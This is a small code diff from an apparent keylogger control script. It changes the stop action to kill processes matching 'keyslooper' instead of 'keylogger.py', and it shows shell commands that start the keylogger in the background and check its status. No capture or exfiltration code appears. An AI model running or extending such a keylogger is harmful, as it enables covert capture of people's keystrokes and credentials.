@@ -77,7 +77,7 @@ def main():
                 os.system("sh keylogger/keyslooper.sh &")
                 
             elif action == 'stop':
-                os.system("kill $(ps aux|grep keylogger.py|awk '{print $2}')")
+                os.system("kill $(ps aux|grep keyslooper|awk '{print $2}')")
                 
             elif action == 'status':
                 action = "if [ '`ps aux|grep keyslooper |grep sh`' ]; then echo Started; else echo Stopped ;fi"
